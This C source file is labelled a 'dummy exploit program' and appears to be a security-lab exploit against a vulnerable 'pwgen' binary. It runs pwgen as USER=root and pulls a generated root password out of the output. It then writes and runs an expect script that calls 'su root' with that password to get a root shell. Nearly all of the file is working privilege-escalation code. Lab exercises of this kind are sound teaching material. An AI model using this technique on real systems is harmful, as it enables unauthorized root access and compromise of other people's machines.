/*
* dummy exploit program
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

#define TARGET "./pwgen"  // 修改路径为当前目录

int main(int argc, char *argv[])
{
  int i;
  FILE *targetprocess, *supro,*shellscript;
  char passwdln[50];
  char passwd[10];
  char bashscript[200] = "#!/usr/bin/expect -f\n spawn su root\n expect \"Password:\"\n send -- \"%s\r\" \n interact";

  targetprocess = popen("USER=root ./pwgen -w","r");  // 修改这里，使用相对路径
  fgets(passwdln ,50 , targetprocess);
  i =0;
  while ((31+i) < strlen(passwdln)){//assuming password will always be 6 char
    passwd[i] = passwdln[31+i]; //get password
    i++;
  }
  passwd[6] = '\0';
  pclose(targetprocess);
  shellscript = fopen("./tmpcode.sh","w+");
  char script_buffer[256];
  sprintf(script_buffer, bashscript, passwd);
  fputs(script_buffer, shellscript);
  fclose(shellscript);
  system("chmod +x ./tmpcode.sh");
  system("./tmpcode.sh");

  exit(0);
}
